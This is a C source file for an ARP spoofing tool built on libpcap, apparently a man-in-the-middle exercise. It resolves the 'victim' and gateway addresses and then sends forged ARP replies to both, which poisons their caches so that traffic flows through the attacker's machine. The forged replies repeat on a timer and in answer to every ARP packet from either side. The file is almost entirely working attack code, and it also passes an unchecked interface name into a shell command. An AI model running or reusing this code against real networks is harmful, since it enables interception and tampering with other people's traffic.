#include "arp.h"
#include <netinet/ether.h>
#include <string.h>
#include <stdlib.h>
#include <sys/time.h>

// set the timer to its (current value + TIME_INTERVAL) when the program starts
int Start_Timer(struct timeval *tv, time_t sec) {
    gettimeofday(tv, NULL);
    tv->tv_sec += sec;
    return 1;
}

//Checks the current time to see whether it > TIME_INTERVAL seconds than the previously noted time.
int Check_Timer(time_t sec) {    
    gettimeofday(&checktv, NULL);
    if (checktv.tv_sec-tv.tv_sec > sec) {     //current time has elapsed the 30 second interval
        gettimeofday(&tv, NULL);
        return 1;    
    }
    else
        return 0;    
}

void get_dev_list(pcap_if_t **pdev_list) {
    if(pcap_findalldevs(pdev_list, error_buffer)) {
        fprintf(stderr, "error in get device list");
        fprintf(stderr, "%s\n", error_buffer);
        return ;
    }
}

void show_dev_list(pcap_if_t *dev_list) {
    pcap_if_t *dev = NULL;
    if(dev_list == NULL) {
        printf("there is no devices\n");
    } else {
        for(dev = dev_list; dev != NULL; dev = dev->next) {
            pcap_addr_t *dev_addr; //interface address that used by pcap_findalldevs()
            for(dev_addr = dev->addresses; dev_addr != NULL; dev_addr = dev_addr->next) {
                    if (dev_addr->addr->sa_family == AF_INET && dev_addr->addr && dev_addr->netmask) { printf("Found a device %s on address %s with netmask %s\n", dev->name, inet_ntoa(((struct sockaddr_in *)dev_addr->addr)->sin_addr), inet_ntoa(((struct sockaddr_in *)dev_addr->netmask)->sin_addr));
                    }
            }
        }
    }
}


bool get_ip(char *interface, struct in_addr *ip) {
    struct in_addr address;
    pcap_if_t *dev = NULL;
    if(dev_list == NULL) {
        printf("there is no devices\n");
    } else {
        for(dev = dev_list; dev != NULL; dev = dev->next) {
                if(0 == strcmp(dev->name, interface)) {
                        pcap_addr_t *dev_addr; //interface address that used by pcap_findalldevs()
                        for(dev_addr = dev->addresses; dev_addr != NULL; dev_addr = dev_addr->next) {
                                if (dev_addr->addr->sa_family == AF_INET && dev_addr->addr && dev_addr->netmask) {
                                        //strcpy(ip, inet_ntoa(((struct sockaddr_in *)dev_addr->addr)->sin_addr));
                                        memcpy(ip, &(((struct sockaddr_in *)dev_addr->addr)->sin_addr), sizeof(struct in_addr));
                                        break;
                                }
                        }
                        return true;
                }
        }
        printf("could not found %s's ipv4 address", interface);
    }

    return false;
}


bool get_mac_from_terminal(char *interface, struct ether_addr *mac_addr) {
    char cmd_with_grep[100] = {0};
    sprintf(cmd_with_grep, "ifconfig %s | %s", interface, GREP_MAC);
    
    FILE* command_stream = popen(cmd_with_grep, "r");
    
    char mac_buf[19] = {0};
    if (fgets(mac_buf, sizeof(mac_buf)-1, command_stream)) {
        struct ether_addr * temp_addr = ether_aton(mac_buf);
        memcpy(mac_addr, temp_addr, sizeof(struct ether_addr));
    }
        
    
    pclose(command_stream);
    return true;
}

bool get_gateway_ip(struct in_addr* gateway_ip) {
    FILE* command_stream = popen("/sbin/ip route | awk '/default/ {print $3}'", "r");
    if(command_stream == NULL) {
        fprintf(stderr, "error happens in get gateway ip\n");
        return false;
    }

    char ip_addr_buf[16] = {0};
    fgets(ip_addr_buf, sizeof(ip_addr_buf), command_stream);
    inet_aton(ip_addr_buf, gateway_ip);

    return true;
}

void send_arp_packet(pcap_t *handle, struct ether_addr *src_mac, struct in_addr *src_ip, struct ether_addr *dst_mac, struct in_addr *dst_ip,  u_int16_t packet_type) {
    Ethh *eth_hdr = NULL;
    Arph *arp_hdr = NULL;
    u_char frame[sizeof(Ethh) + sizeof(Arph)];

    struct ether_addr tmp_dst_mac;
    u_char multicast_mac[ETH_ALEN] = {0xff, 0xff, 0xff, 0xff, 0xff, 0xff};
    u_char query_dst_mac[ETH_ALEN] = {0x00, 0x00, 0x00, 0x00, 0x00, 0x00};

    if(packet_type == ARP_QUERY) {
        memcpy(&tmp_dst_mac, &multicast_mac, sizeof(struct ether_addr)); 
    } else {
        memcpy(&tmp_dst_mac, dst_mac, sizeof(struct ether_addr)); 
    }

    /* create ether header */
    eth_hdr = (Ethh *) malloc(sizeof(Ethh));
    memcpy(eth_hdr->ether_shost, src_mac, ETH_ALEN);
    memcpy(eth_hdr->ether_dhost, &tmp_dst_mac, ETH_ALEN);
    eth_hdr->ether_type = htons(ETH_P_ARP);

    /* create arp header */
    arp_hdr = (Arph *) malloc(sizeof(Arph));
    arp_hdr->hw_type = htons(ARPHRD_ETHER);
    arp_hdr->protocol_type = htons(ETH_P_IP);
    arp_hdr->hw_len = ETHER_ADDR_LEN;
    arp_hdr->protocol_len = sizeof(in_addr_t);   //actually don't need
    arp_hdr->opcode = htons(packet_type);
    memcpy(arp_hdr->src_mac, src_mac, ETH_ALEN);
    memcpy(&(arp_hdr->src_ip),(char *) &(src_ip->s_addr), sizeof(struct in_addr));
    memcpy(arp_hdr->dst_mac, (packet_type == ARP_QUERY?query_dst_mac:&tmp_dst_mac), ETH_ALEN);
    memcpy(&(arp_hdr->dst_ip), (char *) &(dst_ip->s_addr), sizeof(struct in_addr));

    /* concatenate into frame */
    memcpy(frame, eth_hdr, sizeof(Ethh));
    memcpy(frame + sizeof(Ethh), arp_hdr, sizeof(Arph));

    /* show message in console for debug */ 
    BLUE();
    printf("frame is ready to be transfered...\n");
    printf("[src ip]\t\t[dst ip]\n");
    printf("%s\t\t", inet_ntoa(*src_ip));
    printf("%s\n", inet_ntoa(*dst_ip));
    printf("[src mac]\t\t[dst mac]\n");
    printf("%s\t\t", ether_ntoa(src_mac));
    printf("%s\n", ether_ntoa(&tmp_dst_mac));
    CLOSE();

    /* send packet to internet */
    if(pcap_inject(handle, frame, sizeof(frame)) == -1) {
        fprintf(stderr, "%s\n", error_buffer);
        pcap_close(handle);
    }
    free(eth_hdr);
    free(arp_hdr);
}

void handle_packet(u_char* arg, const struct pcap_pkthdr* pkthdr, const u_char* packet) {  
    u_int caplen = pkthdr->caplen;
    u_int length = pkthdr->len;
    if (caplen < ETHER_HDR_LEN) {
        fprintf(stdout,"Packet length less than ethernet header length\n");
        return ;
    } else {
        //printf("find packet's len is %d\n", caplen);
    }
    Ethh *ether_hdr = (Ethh *) packet;  

    if (Check_Timer(TIME_INTERVAL)) {        
        RED();
        printf("Timer timeout!!\n");
        send_arp_packet((pcap_t *)arg, &my_arp.interface_mac, &my_arp.victim_ip, &my_arp.gateway_mac, &my_arp.gateway_ip, ARP_ANS);
        send_arp_packet((pcap_t *)arg, &my_arp.interface_mac, &my_arp.gateway_ip, &my_arp.victim_mac, &my_arp.victim_ip, ARP_ANS);
        CLOSE();
    }
    /* get type of ethernet fram */
    /* Ethernet protocol ID's 
        #define	ETHERTYPE_IP		0x0800		
        #define	ETHERTYPE_ARP		0x0806	
                                    */
    switch(ntohs(ether_hdr->ether_type)) {
        case ETHERTYPE_IP:
            handle_ip(arg, pkthdr, packet);
            break;
        case ETHERTYPE_ARP:
            handle_arp(arg, pkthdr, packet);
            break;
        default:
            printf("[other] packet\n");
            break;
    }
}

void handle_ip(u_char* arg, const struct pcap_pkthdr* pkthdr, const u_char* packet) {  
    YELLOW();
    printf("[ IP  ] packet\n");
    CLOSE();
    return ;
}

void handle_arp(u_char* arg, const struct pcap_pkthdr* pkthdr, const u_char* packet) {  
    Ethh *eth_hdr = (Ethh *)packet;
    Arph *arp_hdr = (Arph *)(packet + sizeof(Ethh));

    printf("ethernet header source: %s", ether_ntoa((const struct ether_addr *)&eth_hdr->ether_shost));
    printf(" destination: %s\n", ether_ntoa((const struct ether_addr *)&eth_hdr->ether_dhost));
    struct in_addr temp_addr;
    memcpy(&temp_addr, &(arp_hdr->dst_ip), sizeof(struct in_addr));

    if(ntohs(arp_hdr->opcode) == ARP_QUERY) {
        YELLOW();
        printf("[ARP Query ] : ");
        printf("my ip is %s\n", inet_ntoa(*(struct in_addr *)&arp_hdr->src_ip));
        printf("who's ip is %s, please tell me your mac\n", inet_ntoa(temp_addr));
        CLOSE();
        if(memcmp(eth_hdr->ether_shost, &my_arp.gateway_mac, ETH_ALEN) == 0) {
            //it's a packet from gateway
            printf("From Gateway...\n");
            send_arp_packet((pcap_t *)arg, &my_arp.interface_mac, &my_arp.victim_ip, &my_arp.gateway_mac, &my_arp.gateway_ip, ARP_ANS);
        } else if(memcmp(eth_hdr->ether_shost, &my_arp.victim_mac, ETH_ALEN) == 0) {
            //it's a packet from victim
            printf("From Victim...\n");
            send_arp_packet((pcap_t *)arg, &my_arp.interface_mac, &my_arp.gateway_ip, &my_arp.victim_mac, &my_arp.victim_ip, ARP_ANS);
       } else if(memcmp(eth_hdr->ether_shost, &my_arp.interface_mac, ETH_ALEN) == 0) {
            printf("From Me!!!\n");
       }

    } else if(ntohs(arp_hdr->opcode) == ARP_ANS) {
        GREEN();
        printf("[ARP Answer] ");
        printf("my ip is %s\n", inet_ntoa(*(struct in_addr *)&arp_hdr->src_ip));
        printf("And my mac is %s\n", ether_ntoa((const struct ether_addr *)&arp_hdr->src_mac));
        CLOSE();
        if(memcmp(arp_hdr->src_ip, &my_arp.gateway_ip, sizeof(struct in_addr)) == 0) {
            //it's a packet from gateway
            printf("From Gateway...\n");
            send_arp_packet((pcap_t *)arg, &my_arp.interface_mac, &my_arp.victim_ip, &my_arp.gateway_mac, &my_arp.gateway_ip, ARP_ANS);
        } else if(memcmp(arp_hdr->src_ip, &my_arp.victim_ip, sizeof(struct in_addr)) == 0) {
            //it's a packet from victim
            printf("From Victim...\n");
            send_arp_packet((pcap_t *)arg, &my_arp.interface_mac, &my_arp.gateway_ip, &my_arp.victim_mac, &my_arp.victim_ip, ARP_ANS);
       }
    }

    return ;
}

void get_mac_from_arp(u_char *packet, struct ether_addr *mac) {
    Ethh *eth_hdr = (Ethh *)packet;
    Arph *arp_hdr = (Arph *)(packet + sizeof(Ethh));
    if(ntohs(eth_hdr->ether_type) == ETHERTYPE_ARP && ntohs(arp_hdr->opcode) == ARP_ANS) {
        printf("[ ARP Answer ] packet\n ip: %s\n", inet_ntoa(*(struct in_addr *)&arp_hdr->src_ip));
        printf("mac: %s\n", ether_ntoa((const struct ether_addr *)&arp_hdr->src_mac));
        memcpy(mac, arp_hdr->src_mac, sizeof(struct ether_addr));
    } else {
        printf("Not a arp answer packet!!!\n");
        exit(-1);
    }
     
}

